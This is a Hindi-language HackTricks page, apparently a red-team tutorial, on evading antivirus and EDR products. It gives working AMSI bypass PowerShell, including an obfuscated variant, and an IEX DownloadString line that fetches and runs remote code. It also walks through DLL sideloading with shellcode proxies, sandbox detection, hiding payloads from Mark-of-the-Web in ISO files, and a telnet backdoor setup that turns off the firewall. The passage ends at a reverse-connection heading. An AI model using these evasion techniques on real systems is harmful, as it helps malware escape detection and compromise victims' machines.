# एंटीवायरस (AV) बायपास

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी कंपनी का विज्ञापन **HackTricks** में देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

**इस पेज को लिखा गया था** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **AV ईवेशन मेथडोलॉजी**

वर्तमान में, AVs एक फ़ाइल को क्या यह हानिकारक है या नहीं यह जांचने के लिए विभिन्न तरीके का उपयोग करते हैं, स्थैतिक पहचान, गतिशील विश्लेषण, और उनके लिए अधिक उन्नत EDRs के लिए, व्यवहारिक विश्लेषण।

### **स्थैतिक पहचान**

स्थैतिक पहचान को एक बाइनरी या स्क्रिप्ट में ज्ञात हानिकारक स्ट्रिंग या बाइट के गुणकों को झंडा दिखाकर प्राप्त किया जाता है, और भी फ़ाइल से जानकारी निकाली जाती है (जैसे फ़ाइल विवरण, कंपनी का नाम, डिजिटल हस्ताक्षर, आइकन, चेकसम, आदि)। इसका मतलब है कि ज्ञात सार्वजनिक उपकरणों का उपयोग करने से आपको अधिक आसानी से पकड़ा जा सकता है, क्योंकि उन्होंने संशोधित और हानिकारक के रूप में झंडा दिया होगा। इस प्रकार की पहचान से बचने के कुछ तरीके हैं:

* **एन्क्रिप्शन**

यदि आप बाइनरी को एन्क्रिप्ट करते हैं, तो AV को आपके प्रोग्राम का पता लगाने का कोई तरीका नहीं होगा, लेकिन आपको किसी प्रकार का लोडर चाहिए होगा जो प्रोग्राम को डिक्रिप्ट और मेमोरी में चलाने के लिए होगा।

* **अवशेषण**

कभी-कभी आपको अवशेषण करने के लिए अपने बाइनरी या स्क्रिप्ट में कुछ स्ट्रिंग्स बदलने की आवश्यकता होती है ताकि यह AV को पार कर सके, लेकिन यह किसी भी चीज को अवशोषित करने के लिए कितना समय लगेगा इस पर निर्भर करता है।

* **कस्टम टूलिंग**

यदि आप अपने खुद के उपकरण विकसित करते हैं, तो कोई जाने वाला बुरा हस्ताक्षर नहीं होगा, लेकिन इसमें बहुत समय और प्रयास लगेगा।

{% hint style="info" %}
Windows Defender स्थैतिक पहचान के खिलाफ जांच के लिए [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) एक अच्छा तरीका है। यह बुनियादी रूप से फ़ाइल को कई सेगमेंट में विभाजित करता है और फिर Defender को प्रत्येक एक को अलग-अलग स्कैन करने के लिए कार्यवाही करता है, इस तरह, यह आपको बता सकता है कि आपके बाइनरी में झंडा दिखाए गए स्ट्रिंग्स या बाइट क्या हैं।
{% endhint %}

मैं आपको इस [YouTube प्लेलिस्ट](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) की जांच करने की अत्यधिक सिफारिश करता हूं जो व्यावहारिक AV ईवेशन के बारे में है।

### **गतिशील विश्लेषण**

गतिशील विश्लेषण तब होता है जब AV आपके बाइनरी को एक सैंडबॉक्स में चलाता है और हानिकारक गतिविधि के लिए देखता है (जैसे आपके ब्राउज़र के पासवर्ड डिक्रिप्ट और पढ़ने की कोशिश, LSASS पर मिनीडंप करने की कोशिश, आदि)। यह भाग काम करने में थोड़ा जटिल हो सकता है, लेकिन यहाँ कुछ चीजें हैं जो आप सैंडबॉक्स से बचने के लिए कर सकते हैं।

* **अभिनय से पहले सोना** जैसे ही यह कार्यान्वयन किया जाता है, यह AV के गतिशील विश्लेषण को छलने का एक बड़ा तरीका हो सकता है। AV के पास फ़ाइलों को स्कैन करने के लिए बहुत कम समय होता है ताकि उपयोगकर्ता के काम को बाधित न करें, इसलिए लंबी नींद का उपयोग करना बाइनरी के विश्लेषण को बाधित कर सकता है। समस्या यह है कि कई AV सैंडबॉक्स इसे छोड़ सकते हैं जैसे ही यह कार्यान्वित होता है।
* **मशीन के संसाधनों की जांच** सामान्यत: सैंडबॉक्स के पास काम करने के लिए बहुत ही कम संसाधन होते हैं (जैसे < 2GB रैम), अन्यथा वे उपयोगकर्ता की मशीन को धीमा कर सकते हैं। आप यहाँ बहुत रचनात्मक हो सकते हैं, उदाहरण के लिए CPU का तापमान या फिर फैन की गति की जांच करके, सैंडबॉक्स में सभी चीजें लागू नहीं होंगी।
* **मशीन-विशेष जांच** यदि आप उस उपयोगकर्ता को लक्ष्य बनाना चाहते हैं जिसका कार्यस्थल "contoso.local" डोमेन से जुड़ा हो, तो आप कंप्यूटर के डोमेन पर जांच कर सकते हैं कि क्या यह आपके द्वारा निर्दिष्ट किया गया है, यदि नहीं, तो आप अपने कार्यक्रम को बंद कर सकते हैं।

यह पता चलता है कि माइक्रोसॉफ्ट डिफेंडर की सैंडबॉक्स कंप्यूटरनाम HAL9TH है, इसलिए, आप अपने मैलवेयर में कंप्यूटर नाम की जांच कर सकते हैं, यदि नाम HAL9TH से मेल खाता है, तो इसका मतलब है कि आप डिफेंडर की सैंडबॉक्स के अंदर हैं, इसलिए आप अपने कार्यक्रम को बंद कर सकते हैं।

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>स्रोत: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

कुछ अन्य वास्तव में अच्छे सुझाव [@mgeeky](https://twitter.com/mariuszbit) से सैंडबॉक्स के खिलाफ जाने के लिए

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev चैनल</p></figcaption></figure>

जैसा कि हमने इस पोस्ट में पहले कहा है, **
## DLL साइडलोडिंग और प्रॉक्सीइंग

**DLL साइडलोडिंग** विक्टिम एप्लिकेशन और हानिकारक पेलोड(जी) को एक साथ रखकर लोडर द्वारा उपयोग किए जाने वाले DLL खोज क्रम का लाभ उठाता है।

आप [Siofra](https://github.com/Cybereason/siofra) और निम्नलिखित पावरशेल स्क्रिप्ट का उपयोग करके DLL साइडलोडिंग के लिए संकटग्रस्त कार्यक्रमों की जांच कर सकते हैं:
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

यह कमांड "C:\Program Files\\" के अंदर DLL हाइजैकिंग के लिए संवेदनशील कार्यक्रमों की सूची और वे DLL फ़ाइलें उत्पन्न करेगी जिन्हें वे लोड करने का प्रयास करते हैं।

मैं आपको **स्वयं DLL हाइजैक करने योग्य/साइडलोड कार्यक्रमों का अन्वेषण करने की सलाह देता हूं**, यह तकनीक सही ढंग से किया जाए तो काफी गुप्त रहती है, लेकिन यदि आप सार्वजनिक रूप से जाने जाने वाले DLL साइडलोड कार्यक्रमों का उपयोग करते हैं, तो आप आसानी से पकड़े जा सकते हैं।

किसी भी दुरुपयोगी DLL को एक ऐसे नाम के साथ रखकर जिस नाम का कोई कार्यक्रम लोड करने की उम्मीद करता है, आपका पेलोड लोड नहीं होगा, क्योंकि कार्यक्रम उस DLL के अंदर कुछ विशिष्ट कार्यों की उम्मीद करता है, इस समस्या को ठीक करने के लिए, हम एक और तकनीक का उपयोग करेंगे जिसे **DLL प्रॉक्सीइंग/फॉरवर्डिंग** कहा जाता है।

**DLL प्रॉक्सीइंग** कार्यक्रम द्वारा प्रॉक्सी (और दुरुपयोगी) DLL से मूल DLL तक के कॉल को आगे भेजता है, इस प्रकार कार्यक्रम की कार्यक्षमता को संरक्षित रखता है और आपके पेलोड का निष्पादन संभालने में सक्षम होता है।

मैं [@flangvik](https://twitter.com/Flangvik/) के [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) परियोजना का उपयोग करूंगा।

निम्नलिखित कदम मैंने अपनाए:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

आखिरी कमांड हमें 2 फ़ाइलें देगी: एक DLL स्रोत कोड टेम्पलेट, और मूलनाम बदली हुई DLL।

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

ये परिणाम हैं:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

हमारे शेलकोड (जिसे [SGN](https://github.com/EgeBalci/sgn) के साथ एन्कोड किया गया है) और प्रॉक्सी DLL दोनों का [antiscan.me](https://antiscan.me) में 0/26 डिटेक्शन दर है! मैं इसे एक सफलता कहूंगा।

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
मैं **ऊचा सिफारिश** करता हूं कि आप [S3cur3Th1sSh1t के twitch VOD](https://www.twitch.tv/videos/1644171543) को DLL साइडलोडिंग और [ippsec के वीडियो](https://www.youtube.com/watch?v=3eROsG\_WNpE) को देखें और हमने जो विस्तार से चर्चा की है, उसके बारे में अधिक जानें।
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze एक पेडलोड टूलकिट है जो सस्पेंडेड प्रोसेसेस, डायरेक्ट सिसकॉल्स, और वैकल्पिक निष्पादन विधियों का उपयोग करके EDRs को छलाने के लिए है`

आप Freeze का उपयोग करके अपने शेलकोड को एक छलकर तरीके से लोड और निष्पादित कर सकते हैं।
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
टालना बस एक बिल्ली और चूहे का खेल है, जो आज काम करता है, वह कल पकड़ा जा सकता है, इसलिए कभी भी केवल एक उपकरण पर भरोसा न करें, यदि संभव हो तो कई टालने की तकनीकों को जोड़ने का प्रयास करें।
{% endhint %}

## AMSI (एंटी-मैलवेयर स्कैन इंटरफेस)

AMSI को "[फाइललेस मैलवेयर](https://en.wikipedia.org/wiki/Fileless\_malware)" को रोकने के लिए बनाया गया था। पहले, AVs केवल **डिस्क पर फ़ाइलें** स्कैन करने में सक्षम थे, इसलिए यदि आप किसी प्रकार से payloads **सीधे मेमोरी में** निष्पादित कर सकते थे, तो AV कुछ भी नहीं कर सकता था इसे रोकने के लिए, क्योंकि इसके पास पर्याप्त दृश्यता नहीं थी।

AMSI सुविधा विंडोज के इन घटकों में एकीकृत है।

* उपयोगकर्ता खाता नियंत्रण, या UAC (EXE, COM, MSI, या ActiveX स्थापना का उच्चाधिकार)
* पावरशेल (स्क्रिप्ट, इंटरैक्टिव उपयोग, और गतिशील कोड मूल्यांकन)
* विंडोज स्क्रिप्ट होस्ट (wscript.exe और cscript.exe)
* जावास्क्रिप्ट और वीबीस्क्रिप्ट
* ऑफिस VBA मैक्रो

यह एंटीवायरस समाधानों को स्क्रिप्ट व्यवहार की जांच करने की अनुमति देता है जिसे एक ऐसे रूप में उजागर किया गया है जो अनक्रिप्टेड और अविकृत है।

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` चलाने पर विंडोज डिफेंडर पर निम्नलिखित चेतावनी प्रकट होगी।

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` को पहले जोड़ता है और फिर एक्जीक्यूटेबल का पथ, जिससे स्क्रिप्ट चलाया गया, इस मामले में, पावरशेल.exe

हमने किसी भी फ़ाइल को डिस्क पर नहीं छोड़ा, लेकिन फिर भी AMSI के कारण मेमोरी में पकड़ गए।

AMSI को चक्कर में लेने के कुछ तरीके हैं:

* **अवशोषण**

क्योंकि AMSI मुख्य रूप से स्थैतिक पकड़ों के साथ काम करता है, इसलिए आप लोड करने की कोशिश की गई स्क्रिप्टों को संशोधित करना डिटेक्शन से बचने का एक अच्छा तरीका हो सकता है।

हालांकि, AMSI के पास यदि यह कई लेयर्स हो तो भी स्क्रिप्टों को अनऑब्स्केट करने की क्षमता है, तो अवशोषण किया जा सकता है, यह न करने के लिए एक बुरा विकल्प हो सकता है। यह इसे टालना इतना सीधा नहीं बनाता। हालांकि, कभी-कभी, आपको कुछ चरणों के नाम बदलने की आवश्यकता होती है और आप अच्छे हो जाएंगे, इसलिए यह उस पर कितना झंझट है इस पर निर्भर करता है।

* **AMSI बाइपास**

क्योंकि AMSI को पावरशेल (जैसे cscript.exe, wscript.exe, आदि) प्रक्रिया में एक DLL लोड करके लागू किया गया है, इसे आसानी से भ्रमित किया जा सकता है भले ही एक अनधिकृत उपयोगकर्ता के रूप में चल रहा हो। इस AMSI के कार्यान्वयन में दोष के कारण, शोधकर्ताओं ने AMSI स्कैनिंग से बचने के कई तरीके खोजे हैं।

**त्रुटि को बल प्रदान करना**

AMSI प्रारंभीकरण को विफल करने (amsiInitFailed) के लिए मजबूर करना इस नतीजे में लाएगा कि वर्तमान प्रक्रिया के लिए कोई स्कैन प्रारंभ नहीं होगा। मूल रूप से इसे [मैट ग्रेबर](https://twitter.com/mattifestation) ने खुलासा किया था और माइक्रोसॉफ्ट ने इसका व्यापक उपयोग रोकने के लिए एक हस्ताक्षर विकसित किया है।

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

केवल एक पंक्ति पावरशेल कोड की आवश्यकता थी ताकि वर्तमान पावरशेल प्रक्रिया के लिए AMSI अप्रयोग्य हो जाए। यह पंक्ति बेशक AMSI द्वारा फ्लैग की गई है, इसलिए इस तकनीक का उपयोग करने के लिए कुछ संशोधन की आवश्यकता है।

यहाँ एक संशोधित AMSI बाईपास है जिसे मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**मेमोरी पैचिंग**

यह तकनीक पहले से ही [@RastaMouse](https://twitter.com/\_RastaMouse/) द्वारा खोजी गई थी और इसमें "AmsiScanBuffer" फ़ंक्शन के पते को खोजना होता है जो amsi.dll में होता है (उपयोगकर्ता द्वारा प्रदान किए गए इनपुट को स्कैन करने के लिए जिम्मेदार है) और इसे इंस्ट्रक्शन के साथ ओवरराइट करना होता है ताकि यह वास्तविक स्कैन का परिणाम 0 लौटाए, जो साफ परिणाम के रूप में व्याख्या किया जाता है।

{% hint style="info" %}
कृपया अधिक विस्तृत व्याख्या के लिए [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।
{% endhint %}

AMSI को बायपास करने के लिए पावरशेल के साथ कई अन्य तकनीकें भी हैं, [**इस पेज**](basic-powershell-for-pentesters/#amsi-bypass) और [इस रेपो](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) की जांच करें और उनके बारे में और अधिक जानें।

या यह स्क्रिप्ट जो मेमोरी पैचिंग के माध्यम से पावरशेल को पैच करेगा

## अवगुणन

कई उपकरण हैं जो क्लियर-टेक्स्ट को अवगुणित करने, **मेटाप्रोग्रामिंग टेम्पलेट्स** जेनरेट करने या **कंपाइल बाइनरी** को अवगुणित करने के लिए उपयोग किए जा सकते हैं जैसे:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# अवगुणक**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस परियोजना का उद्देश्य [LLVM](http://www.llvm.org/) कंपाइलेशन सुइट का एक ओपन-सोर्स फोर्क प्रदान करना है जो [कोड अवगुणन](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) और टैम्पर-प्रूफिंग के माध्यम से वृद्धि देने में सक्षम हो।
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator दिखाता है कि `C++11/14` भाषा का उपयोग करके कैसे कंपाइल समय पर बिना किसी बाह्य उपकरण का उपयोग किए और कंपाइलर को संशोधित किए बिना अवगुणित कोड उत्पन्न किया जा सकता है।
* [**obfy**](https://github.com/fritzone/obfy): C++ टेम्पलेट मेटाप्रोग्रामिंग फ्रेमवर्क द्वारा उत्पन्न अवगुणित ऑपरेशन की एक परत जोड़ें जो अनुप्रयोग को क्रैक करने वाले व्यक्ति के जीवन को थोड़ा सा कठिन बना देगी।
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 बाइनरी अवगुणक है जो विभिन्न पीई फ़ाइलों को अवगुणित करने में सक्षम है: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame एक अर्बिट्रेरी एक्जीक्यूटेबल्स के लिए एक सरल मेटामॉर्फिक कोड इंजन है।
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator एक फाइन-ग्रेन्ड कोड अवगुणन फ्रेमवर्क है जो ROP (रिटर्न-ओरिएंटेड प्रोग्रामिंग) का उपयोग करके LLVM समर्थित भाषाओं के लिए एक प्रोग्राम को अवगुणित करता है। ROPfuscator एक प्रोग्राम को नियंत्रण की सामान्य धारणा को बदलकर एसेम्बली कोड स्तर पर अवगुणित करता है, जिससे हमारी साहज नियंत्रण प्रवाह की धारणा को ठगा जाता है।
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt एक .NET PE Crypter है जो Nim में लिखा गया है
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को शेलकोड में परिवर्तित करने और फिर उन्हें लोड करने में सक्षम है

## स्मार्टस्क्रीन और MoTW

आपने शायद इंटरनेट से कुछ एक्जीक्यूटेबल डाउनलोड करके उन्हें चलाने के समय इस स्क्रीन को देखा होगा।

माइक्रोसॉफ्ट डिफेंडर स्मार्टस्क्रीन एक सुरक्षा तंत्र है जो अंत उपयोगकर्ता को पोटेंशियली हानिकारक एप्लिकेशन चलाने से बचाने के लिए निर्मित है।

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

स्मार्टस्क्रीन मुख्य रूप से एक प्रतिष्ठा-आधारित दृष्टिकोण के साथ काम करता है, अर्थात असामान्य डाउनलोड एप्लिकेशन स्मार्टस्क्रीन को ट्रिगर करेंगे जिससे अंत उपयोगकर्ता को फ़ाइल को चलाने से रोका जाएगा (हालांकि फ़ाइल को फिर भी चलाया जा सकता है जरूरी जानकारी -> फिर भी चलाएं पर क्लिक करके)।

**MoTW** (Mark of The Web) एक [NTFS वैकल्पिक डेटा स्ट्रीम](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) है जिसका नाम Zone.Identifier है जो इंटरनेट से फ़ाइलें डाउनलोड करते समय स्वचालित रूप से बनाया जाता है, साथ ही उस URL के साथ जिससे यह डाउनलोड किया गया था।

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>इंटरनेट से डाउनलोड की गई फ़ाइल के लिए Zone.Identifier ADS की जांच।</p></figcaption></figure>

{% hint style="info" %}
यह महत्वपूर्ण है कि **विश्वसनीय** हस्ताक्षर सर्टिफिकेट के साथ साइन की गई एक्जीक्यूटेबल्स **स्मार्टस्क्रीन को ट्रिगर नहीं करेंगी**।
{% endhint %}

अपने पेलोड को Mark of The Web से बचाने के लिए एक प्रभावी तरीका उन्हें किसी प्रकार के कंटेनर के अंदर पैकेज करना है जैसे कि एक ISO। यह इसलिए होता है क्योंकि Mark-of-the-Web (MOTW) **non NTFS** वॉल्यूम पर लागू **नहीं** किया जा सकता है।

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक उपकरण है जो पेलोड को मार्क ऑफ द वेब से बचाने के लिए आउटपुट कंटेनर में पैकेज करता है।

उदाहरण उपयोग:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
यहाँ एक डेमो है जिसमें [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) का उपयोग करके ISO फ़ाइलों में payloads को SmartScreen को बायपास करने का तरीका दिखाया गया है।

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# Assembly Reflection

मेमोरी में C# बाइनरीज़ लोड करना काफी समय से जाना जा रहा है और यह एंटीवायरस द्वारा पकड़े जाने के बिना अपने पोस्ट-एक्सप्लोइटेशन टूल्स को चलाने का एक बहुत अच्छा तरीका है।

C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) मेमोरी में C# असेम्ब्लीज़ को सीधे एक्सीक्यूट करने की क्षमता प्रदान करते हैं, लेकिन इसे करने के विभिन्न तरीके हैं:

* **Fork\&Run**

इसमें **एक नया बलिदानी प्रक्रिया उत्पन्न करना** शामिल है, नई प्रक्रिया में अपने पोस्ट-एक्सप्लोइटेशन दुरुपयोगी कोड को इंजेक्ट करना, उस नई प्रक्रिया को चलाना और समाप्त होने पर, नई प्रक्रिया को मार देना। इसके फायदे और नुकसान दोनों हैं। फोर्क और रन विधि का लाभ यह है कि निष्क्रिय अंकुर इम्प्लांट प्रक्रिया के **बाहर** निष्क्रिय होता है। इसका मतलब है कि यदि हमारे पोस्ट-एक्सप्लोइटेशन कार्रवाई में कुछ गलत हो जाता है या पकड़ जाता है, तो हमारे **इम्प्लांट के जीवित रहने** की **अधिक संभावना** है। नुकसान यह है कि आपको **व्यवहारिक पहचान** द्वारा पकड़ने की **अधिक संभावना** है।

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

इसका मतलब है पोस्ट-एक्सप्लोइटेशन दुरुपयोगी कोड को **अपनी खुद की प्रक्रिया में** इंजेक्ट करना। इस तरीके से, आपको एक नई प्रक्रिया बनाने और उसे एंटीवायरस द्वारा स्कैन करवाने से बचने में मदद मिलती है, लेकिन नुकसान यह है कि यदि आपके पेलोड के निष्पादन में कुछ गलत हो जाता है, तो आपके बीकन को खोने की **अधिक संभावना** है क्योंकि यह क्रैश हो सकता है।

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
यदि आप C# Assembly लोडिंग के बारे में और अधिक पढ़ना चाहते हैं, तो कृपया इस लेख [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनके InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) की जांच करें।
{% endhint %}

आप C# Assemblies **PowerShell से** भी लोड कर सकते हैं, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) देखें।

## अन्य प्रोग्रामिंग भाषाओं का उपयोग

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) में प्रस्तावित है कि अटैकर नियंत्रित SMB साझा परिवार पर स्थापित अनुप्रयोगी वातावरण का उपयोग करके दुरुपयोगी कोड को अन्य भाषाओं में चलाना संभव है।

अंतर्वार्ती बाइनरीज़ और अटैकर नियंत्रित मशीन की मेमोरी में इन भाषाओं में विचारहीन कोड को **अंजाम देने** की अनुमति देने से आप अपने बीमित मशीन की मेमोरी में विचारहीन कोड को **अंजाम दे सकते हैं**।

रेपो इसका सुझाव देता है: डिफेंडर अब भी स्क्रिप्ट को स्कैन करता है लेकिन Go, Java, PHP आदि का उपयोग करके हमें **स्थिर हस्ताक्षरों को बायपास करने** की **अधिकता** होती है। इन भाषाओं में अनोभ्फस्केटेड रिवर्स शैल वाले स्क्रिप्ट के साथ परीक्षण सफल साबित हुआ है।

## उन्नत टालना

टालना एक बहुत जटिल विषय है, कभी-कभी आपको एक ही सिस्टम में कई विभिन्न टेलीमेट्री स्रोतों को ध्यान में रखना पड़ता है, इसलिए पूरी तरह से परिपक्व वातावरण में पूरी तरह से अनप्रकट रहना लगभग असंभव है।

जिस भी वातावरण के खिलाफ आप जाते हैं, उसके अपने शक्तियों और कमजोरियों होते हैं।

मैं आपको उन्नत टालन तकनीकों के बारे में जानने के लिए इस टॉक को देखने की ऊर्जा देता हूँ [@ATTL4S](https://twitter.com/DaniLJ94) से।

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

यह एक और शानदार टॉक है [@mariuszbit](https://twitter.com/mariuszbit) के द्वारा टालने के बारे में।

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **पुरानी तकनीकें**

### **जांचें कि Defender किस हिस्से को दुरुपयोगी मानता है**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं जो **बाइनरी के हिस्से को हटा देगा** जब तक वह यह नहीं पता लगाता है कि Defender किस हिस्से को दुरुपयोगी मान रहा है और इसे आपको विभाजित कर देगा।\
एक और उपकरण जो **एक ही चीज कर रहा है** है [**avred**](https://github.com/dobin/avred) जिसके एक ओपन वेब सेवा में सेवा प्रदान कर रहा है [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **टेलनेट सर्वर**

Windows10 तक, सभी Windows के साथ एक **टेलनेट सर्वर** आता था जिसे आप (व्यवस्थापक के रूप में) इंस्टॉल कर सकते थे:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
इसे **शुरू** करें जब सिस्टम शुरू होता है और अब इसे **चलाएं**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**टेलनेट पोर्ट बदलें** (छल) और फ़ायरवॉल अक्षम करें:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

इसे यहाँ से डाउनलोड करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको सेटअप नहीं, बिन डाउनलोड करना है)

**मेज़बान पर**: _**winvnc.exe**_ को चलाएं और सर्वर को कॉन्फ़िगर करें:

* _TrayIcon_ को अक्षम करें
* _VNC Password_ में पासवर्ड सेट करें
* _View-Only Password_ में पासवर्ड सेट करें

फिर, बाइनरी _**winvnc.exe**_ और **नया** बनाया गया फ़ाइल _**UltraVNC.ini**_ को **विक्टिम** के अंदर ले जाएं

#### **रिवर्स कनेक्शन**

